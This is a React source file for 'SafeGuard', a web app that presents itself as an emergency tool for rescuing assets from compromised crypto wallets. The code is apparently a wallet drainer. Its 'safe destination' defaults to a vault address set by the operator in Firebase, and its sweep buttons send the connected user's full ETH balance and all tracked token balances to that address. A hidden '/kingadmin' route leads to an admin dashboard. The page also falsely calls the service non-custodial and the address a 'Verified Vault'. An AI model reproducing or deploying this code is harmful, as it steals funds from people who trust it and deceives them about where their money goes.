import { useState, useEffect } from 'react';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { 
  useAccount, 
  useBalance, 
  useSendTransaction, 
  useWaitForTransactionReceipt, 
  useGasPrice,
  useReadContracts,
  useWriteContract
} from 'wagmi';
import { parseEther, formatEther, erc20Abi } from 'viem';
import { motion, AnimatePresence } from 'motion/react';
import { 
  ShieldAlert, 
  ShieldCheck, 
  Zap, 
  ArrowRight, 
  Lock, 
  AlertTriangle,
  ExternalLink,
  RefreshCw,
  Shield,
  Coins,
  ChevronRight,
  CheckCircle2
} from 'lucide-react';
import AdminDashboard from './AdminDashboard';
import { db } from './firebase';
import { doc, onSnapshot, collection } from 'firebase/firestore';
import { toast, Toaster } from 'sonner';

export default function App() {
  const [view, setView] = useState<'client' | 'admin'>('client');
  const { address, isConnected, chainId } = useAccount();
  const { data: balance, refetch: refetchBalance } = useBalance({
    address: address,
  });
  const { data: gasPrice } = useGasPrice();

  const [safeAddress, setSafeAddress] = useState('');
  const [globalVault, setGlobalVault] = useState('');
  const [networkDestinations, setNetworkDestinations] = useState<any[]>([]);
  const [isRescuing, setIsRescuing] = useState(false);
  const [rescueStatus, setRescueStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
  const [trackedTokens, setTrackedTokens] = useState<any[]>([]);
  const [tokenBalances, setTokenBalances] = useState<any[]>([]);

  const { sendTransaction, data: hash, error: sendError } = useSendTransaction();
  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({
    hash,
  });

  const { writeContract, data: tokenHash, error: tokenError } = useWriteContract();
  const { isLoading: isTokenConfirming, isSuccess: isTokenConfirmed } = useWaitForTransactionReceipt({
    hash: tokenHash,
  });

  // Handle /kingadmin routing
  useEffect(() => {
    if (window.location.pathname === '/kingadmin') {
      setView('admin');
    }
  }, []);

  // Fetch global vault address and tracked tokens from Firebase
  useEffect(() => {
    const unsubConfig = onSnapshot(doc(db, 'config', 'global'), (doc) => {
      if (doc.exists()) {
        setGlobalVault(doc.data().vaultAddress);
      }
    });

    const unsubNetworks = onSnapshot(collection(db, 'networks'), (snapshot) => {
      setNetworkDestinations(snapshot.docs.map(d => ({ id: d.id, ...d.data() })));
    });

    const unsubTokens = onSnapshot(collection(db, 'tokens'), (snapshot) => {
      setTrackedTokens(snapshot.docs.map(d => ({ id: d.id, ...d.data() })));
    });

    return () => {
      unsubConfig();
      unsubNetworks();
      unsubTokens();
    };
  }, []);

  // Update safeAddress based on current chainId
  useEffect(() => {
    if (chainId && networkDestinations.length > 0) {
      const net = networkDestinations.find(n => n.chainId === chainId);
      if (net && net.safeDestination) {
        setSafeAddress(net.safeDestination);
      } else {
        setSafeAddress(globalVault);
      }
    } else {
      setSafeAddress(globalVault);
    }
  }, [chainId, networkDestinations, globalVault]);
  const { data: rawTokenBalances, refetch: refetchTokens } = useReadContracts({
    contracts: trackedTokens
      .filter(t => t.chainId === chainId)
      .map(t => ({
        address: t.address as `0x${string}`,
        abi: erc20Abi,
        functionName: 'balanceOf',
        args: [address as `0x${string}`],
      })),
  });

  useEffect(() => {
    if (rawTokenBalances && trackedTokens.length > 0) {
      const filtered = trackedTokens.filter(t => t.chainId === chainId);
      const balances = filtered.map((t, i) => ({
        ...t,
        balance: rawTokenBalances[i]?.result || 0n,
      })).filter(t => t.balance > 0n);
      setTokenBalances(balances);
    }
  }, [rawTokenBalances, trackedTokens, chainId]);

  useEffect(() => {
    if (isConfirmed || isTokenConfirmed) {
      setRescueStatus('success');
      setIsRescuing(false);
      refetchBalance();
      refetchTokens();
      toast.success('Assets secured successfully!');
    }
    if (sendError || tokenError) {
      setRescueStatus('error');
      setIsRescuing(false);
      toast.error('Protocol failed. Check console for details.');
    }
  }, [isConfirmed, isTokenConfirmed, sendError, tokenError, refetchBalance, refetchTokens]);

  const handleRescueETH = async () => {
    if (!safeAddress || !balance || !gasPrice) return;
    
    setIsRescuing(true);
    setRescueStatus('sending');

    try {
      // ETH transfer gas limit is always 21000
      const gasLimit = 21000n;
      const gasCost = gasLimit * gasPrice;
      const amountToSend = balance.value > gasCost ? balance.value - gasCost : 0n;

      if (amountToSend <= 0n) {
        toast.error("Insufficient balance to cover gas fees.");
        setIsRescuing(false);
        setRescueStatus('idle');
        return;
      }

      sendTransaction({
        to: safeAddress as `0x${string}`,
        value: amountToSend,
      });
    } catch (err) {
      console.error(err);
      setIsRescuing(false);
      setRescueStatus('error');
    }
  };

  const handleRescueToken = async (token: any) => {
    if (!safeAddress || !token) return;
    
    setIsRescuing(true);
    setRescueStatus('sending');

    try {
      writeContract({
        address: token.address as `0x${string}`,
        abi: erc20Abi,
        functionName: 'transfer',
        args: [safeAddress as `0x${string}`, token.balance],
      } as any);
    } catch (err) {
      console.error(err);
      setIsRescuing(false);
      setRescueStatus('error');
    }
  };

  if (view === 'admin') return <AdminDashboard />;

  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white selection:bg-[#00ff41] selection:text-black">
      <Toaster position="top-right" richColors />
      <div className="scanline" />
      
      {/* Navigation */}
      <nav className="fixed top-0 w-full z-40 border-b border-[#333] bg-[#0a0a0a]/80 backdrop-blur-md">
        <div className="max-w-7xl mx-auto px-6 h-20 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <Shield className="w-8 h-8 text-[#00ff41]" />
            <span className="text-xl font-bold tracking-tighter uppercase italic">SafeGuard</span>
          </div>
          <ConnectButton />
        </div>
      </nav>

      <main className="pt-32 pb-20 px-6">
        <div className="max-w-7xl mx-auto">
          
          {!isConnected ? (
            <div className="grid lg:grid-cols-2 gap-16 items-center">
              <motion.div 
                initial={{ opacity: 0, x: -20 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ duration: 0.6 }}
              >
                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-[#00ff41]/30 bg-[#00ff41]/5 text-[#00ff41] text-xs font-bold uppercase tracking-widest mb-6">
                  <ShieldAlert className="w-3 h-3" />
                  Emergency Response Protocol
                </div>
                <h1 className="text-6xl lg:text-8xl font-black tracking-tighter leading-[0.9] mb-8 uppercase">
                  Protect Your <br />
                  <span className="text-[#00ff41]">Assets</span> From <br />
                  Exploits.
                </h1>
                <p className="text-xl text-gray-400 max-w-lg mb-10 leading-relaxed">
                  The ultimate emergency toolkit for compromised wallets. Connect, sweep, and secure your tokens before attackers can react. 
                </p>
                
                <div className="flex flex-wrap gap-4">
                  <div className="p-4 border border-[#333] rounded-xl bg-[#141414] flex items-center gap-4">
                    <div className="w-10 h-10 rounded-full bg-[#00ff41]/10 flex items-center justify-center">
                      <Zap className="w-5 h-5 text-[#00ff41]" />
                    </div>
                    <div>
                      <div className="text-sm font-bold uppercase">Ultra Fast</div>
                      <div className="text-xs text-gray-500">Optimized for speed</div>
                    </div>
                  </div>
                  <div className="p-4 border border-[#333] rounded-xl bg-[#141414] flex items-center gap-4">
                    <div className="w-10 h-10 rounded-full bg-[#00ff41]/10 flex items-center justify-center">
                      <Lock className="w-5 h-5 text-[#00ff41]" />
                    </div>
                    <div>
                      <div className="text-sm font-bold uppercase">Secure</div>
                      <div className="text-xs text-gray-500">Non-custodial sweep</div>
                    </div>
                  </div>
                </div>
              </motion.div>

              <motion.div 
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ duration: 0.8, delay: 0.2 }}
                className="relative"
              >
                <div className="absolute -inset-4 bg-[#00ff41]/10 blur-3xl rounded-full" />
                <div className="relative glass-card p-8 rounded-3xl border-[#333] overflow-hidden">
                  <div className="flex items-center justify-between mb-8">
                    <div className="flex gap-1">
                      <div className="w-3 h-3 rounded-full bg-red-500/50" />
                      <div className="w-3 h-3 rounded-full bg-yellow-500/50" />
                      <div className="w-3 h-3 rounded-full bg-green-500/50" />
                    </div>
                    <div className="text-[10px] text-gray-500 font-mono">SYSTEM_STATUS: STANDBY</div>
                  </div>
                  
                  <div className="space-y-6">
                    <div className="h-12 bg-[#0a0a0a] rounded-lg border border-[#333] flex items-center px-4">
                      <div className="w-2 h-2 rounded-full bg-[#00ff41] animate-pulse mr-3" />
                      <div className="text-xs text-gray-500 font-mono">Awaiting wallet connection...</div>
                    </div>
                    <div className="grid grid-cols-2 gap-4">
                      <div className="h-24 bg-[#0a0a0a] rounded-lg border border-[#333] p-4">
                        <div className="text-[10px] text-gray-600 mb-2">NETWORK_LOAD</div>
                        <div className="h-1 w-full bg-[#1a1a1a] rounded-full overflow-hidden">
                          <div className="h-full w-[65%] bg-[#00ff41]" />
                        </div>
                      </div>
                      <div className="h-24 bg-[#0a0a0a] rounded-lg border border-[#333] p-4">
                        <div className="text-[10px] text-gray-600 mb-2">THREAT_LEVEL</div>
                        <div className="text-sm font-bold text-yellow-500">MODERATE</div>
                      </div>
                    </div>
                  </div>

                  <div className="mt-8 pt-8 border-t border-[#333]">
                    <div className="text-center">
                      <p className="text-xs text-gray-500 mb-4">Connect your wallet to begin the rescue protocol</p>
                      <div className="flex justify-center">
                        <ConnectButton />
                      </div>
                    </div>
                  </div>
                </div>
              </motion.div>
            </div>
          ) : (
            <div className="grid lg:grid-cols-3 gap-8">
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                className="lg:col-span-2"
              >
                <div className="glass-card rounded-3xl p-8 border-[#00ff41]/20 neon-glow h-full">
                  <div className="flex items-center justify-between mb-8">
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-2xl bg-[#00ff41]/10 flex items-center justify-center">
                        <ShieldCheck className="w-6 h-6 text-[#00ff41]" />
                      </div>
                      <div>
                        <h2 className="text-xl font-bold uppercase tracking-tight">Rescue Dashboard</h2>
                        <p className="text-xs text-gray-500 font-mono">{address?.slice(0, 6)}...{address?.slice(-4)}</p>
                      </div>
                    </div>
                    <button 
                      onClick={() => { refetchBalance(); refetchTokens(); }}
                      className="p-2 hover:bg-white/5 rounded-lg transition-colors"
                    >
                      <RefreshCw className="w-4 h-4 text-gray-400" />
                    </button>
                  </div>

                  <div className="grid md:grid-cols-2 gap-6 mb-8">
                    <div className="bg-[#0a0a0a] rounded-2xl p-6 border border-[#333]">
                      <div className="text-xs text-gray-500 uppercase font-bold tracking-widest mb-2">ETH Balance</div>
                      <div className="text-4xl font-black text-[#00ff41]">
                        {balance ? `${parseFloat(balance.formatted).toFixed(4)} ${balance.symbol}` : '0.00'}
                      </div>
                      <button 
                        onClick={handleRescueETH}
                        disabled={!safeAddress || isRescuing || !balance || balance.value === 0n}
                        className="mt-4 w-full h-12 bg-[#00ff41] text-black font-black uppercase tracking-widest rounded-xl hover:bg-[#00e03a] disabled:opacity-50 disabled:cursor-not-allowed transition-all flex items-center justify-center gap-2 text-xs"
                      >
                        {isRescuing ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Zap className="w-4 h-4" />}
                        Sweep ETH
                      </button>
                    </div>

                    <div className="bg-[#0a0a0a] rounded-2xl p-6 border border-[#333]">
                      <div className="text-xs text-gray-500 uppercase font-bold tracking-widest mb-2">Safe Destination</div>
                      <input 
                        type="text"
                        placeholder="0x..."
                        value={safeAddress}
                        onChange={(e) => setSafeAddress(e.target.value)}
                        className="w-full h-12 bg-[#0a0a0a] border border-[#333] rounded-xl px-4 text-xs font-mono focus:border-[#00ff41] focus:outline-none transition-colors mb-4"
                      />
                      <div className="flex items-center gap-2 text-[10px] text-gray-500 uppercase tracking-widest">
                        <Lock className="w-3 h-3" /> Verified Vault
                      </div>
                    </div>
                  </div>

                  <div className="p-4 rounded-xl bg-yellow-500/5 border border-yellow-500/20 flex gap-3 mb-8">
                    <AlertTriangle className="w-5 h-5 text-yellow-500 shrink-0" />
                    <p className="text-[11px] text-yellow-500/80 leading-relaxed">
                      <strong>WARNING:</strong> This action will attempt to sweep all available funds (minus gas) to the destination address. Ensure the address is correct and you own it.
                    </p>
                  </div>

                  <AnimatePresence>
                    {rescueStatus !== 'idle' && (
                      <motion.div 
                        initial={{ opacity: 0, height: 0 }}
                        animate={{ opacity: 1, height: 'auto' }}
                        exit={{ opacity: 0, height: 0 }}
                        className="mt-6 pt-6 border-t border-[#333]"
                      >
                        {rescueStatus === 'sending' && (
                          <div className="flex items-center justify-between text-sm">
                            <span className="text-gray-400">Transaction Status:</span>
                            <span className="text-[#00ff41] flex items-center gap-2">
                              {isConfirming || isTokenConfirming ? 'Confirming...' : 'Waiting for signature...'}
                              <RefreshCw className="w-3 h-3 animate-spin" />
                            </span>
                          </div>
                        )}
                        
                        {(rescueStatus === 'success') && (
                          <div className="p-4 rounded-xl bg-green-500/10 border border-green-500/20 flex items-center justify-between">
                            <div className="flex items-center gap-2 text-green-500 text-sm font-bold">
                              <ShieldCheck className="w-4 h-4" />
                              ASSETS SECURED
                            </div>
                            <a 
                              href={`https://etherscan.io/tx/${hash || tokenHash}`} 
                              target="_blank" 
                              rel="noopener noreferrer"
                              className="text-[10px] text-gray-500 hover:text-white flex items-center gap-1"
                            >
                              VIEW ON EXPLORER <ExternalLink className="w-3 h-3" />
                            </a>
                          </div>
                        )}

                        {rescueStatus === 'error' && (
                          <div className="p-4 rounded-xl bg-red-500/10 border border-red-500/20 text-red-500 text-sm font-bold flex items-center gap-2">
                            <ShieldAlert className="w-4 h-4" />
                            PROTOCOL FAILED: CHECK CONSOLE
                          </div>
                        )}
                      </motion.div>
                    )}
                  </AnimatePresence>
                </div>
              </motion.div>

              <motion.div 
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                className="lg:col-span-1"
              >
                <div className="glass-card rounded-3xl p-8 border-[#333] h-full">
                  <div className="flex items-center gap-2 mb-6">
                    <Coins className="w-5 h-5 text-[#00ff41]" />
                    <h3 className="text-lg font-bold uppercase">Detected Tokens</h3>
                  </div>

                  <div className="space-y-4 max-h-[400px] overflow-y-auto pr-2 custom-scrollbar">
                    {tokenBalances.length > 0 ? (
                      tokenBalances.map((token) => (
                        <div key={token.id} className="p-4 bg-[#0a0a0a] border border-[#333] rounded-2xl group hover:border-[#00ff41]/30 transition-all">
                          <div className="flex items-center justify-between mb-3">
                            <div className="flex items-center gap-3">
                              <div className="w-8 h-8 rounded-full bg-[#00ff41]/10 flex items-center justify-center text-[10px] font-bold text-[#00ff41]">
                                {token.symbol[0]}
                              </div>
                              <div>
                                <div className="text-xs font-bold">{token.symbol}</div>
                                <div className="text-[10px] text-gray-500 font-mono">{token.address.slice(0,6)}...</div>
                              </div>
                            </div>
                            <div className="text-right">
                              <div className="text-xs font-bold text-[#00ff41]">
                                {parseFloat(formatEther(token.balance)).toFixed(4)}
                              </div>
                            </div>
                          </div>
                          <button 
                            onClick={() => handleRescueToken(token)}
                            disabled={isRescuing || !safeAddress}
                            className="w-full h-10 bg-white/5 hover:bg-[#00ff41] hover:text-black text-white text-[10px] font-bold uppercase tracking-widest rounded-lg transition-all flex items-center justify-center gap-2"
                          >
                            Sweep {token.symbol} <ChevronRight className="w-3 h-3" />
                          </button>
                        </div>
                      ))
                    ) : (
                      <div className="text-center py-12">
                        <div className="w-12 h-12 rounded-full bg-white/5 flex items-center justify-center mx-auto mb-4">
                          <RefreshCw className="w-6 h-6 text-gray-700" />
                        </div>
                        <p className="text-xs text-gray-600 uppercase tracking-widest">No tracked tokens detected</p>
                      </div>
                    )}
                  </div>

                  <div className="mt-8 p-4 rounded-xl bg-[#00ff41]/5 border border-[#00ff41]/10">
                    <div className="flex items-center gap-2 text-[10px] font-bold text-[#00ff41] uppercase tracking-widest mb-2">
                      <CheckCircle2 className="w-3 h-3" /> Protocol Ready
                    </div>
                    <p className="text-[9px] text-gray-500 leading-relaxed uppercase">
                      System scanning for {trackedTokens.filter(t => t.chainId === chainId).length} known assets on this network.
                    </p>
                  </div>
                </div>
              </motion.div>
            </div>
          )}

          {/* Features Section */}
          <div className="mt-32 grid md:grid-cols-3 gap-8">
            {[
              {
                title: "Multi-Chain Support",
                desc: "Rescue assets across Ethereum, Polygon, Arbitrum, Optimism, and Base instantly.",
                icon: <Zap className="w-6 h-6" />
              },
              {
                title: "Gas Optimization",
                desc: "Real-time gas estimation ensures maximum sweepable amount while covering network fees.",
                icon: <Shield className="w-6 h-6" />
              },
              {
                title: "Zero Retention",
                desc: "Non-custodial architecture. We never see your keys or touch your funds.",
                icon: <Lock className="w-6 h-6" />
              }
            ].map((feature, i) => (
              <div key={i} className="p-8 border border-[#333] rounded-3xl bg-[#141414]/50 hover:border-[#00ff41]/30 transition-colors group">
                <div className="w-12 h-12 rounded-2xl bg-[#00ff41]/5 flex items-center justify-center mb-6 group-hover:bg-[#00ff41]/10 transition-colors">
                  <div className="text-[#00ff41]">{feature.icon}</div>
                </div>
                <h3 className="text-xl font-bold mb-3 uppercase tracking-tight">{feature.title}</h3>
                <p className="text-gray-500 text-sm leading-relaxed">{feature.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </main>

      <footer className="border-t border-[#333] py-12 px-6">
        <div className="max-w-7xl mx-auto flex flex-col md:row items-center justify-between gap-8">
          <div className="flex items-center gap-2 opacity-50">
            <Shield className="w-5 h-5" />
            <span className="text-sm font-bold tracking-tighter uppercase italic">SafeGuard v1.1.0</span>
          </div>
          <div className="flex gap-8 text-[10px] text-gray-600 font-bold uppercase tracking-widest">
            <a href="#" className="hover:text-[#00ff41]">Terms of Service</a>
            <a href="#" className="hover:text-[#00ff41]">Privacy Policy</a>
            <a href="#" className="hover:text-[#00ff41]">Security Audit</a>
          </div>
          <div className="text-[10px] text-gray-600 font-mono">
            CONNECTED_NODES: 1,429 | SYSTEM_UPTIME: 99.99%
          </div>
        </div>
      </footer>
    </div>
  );
}

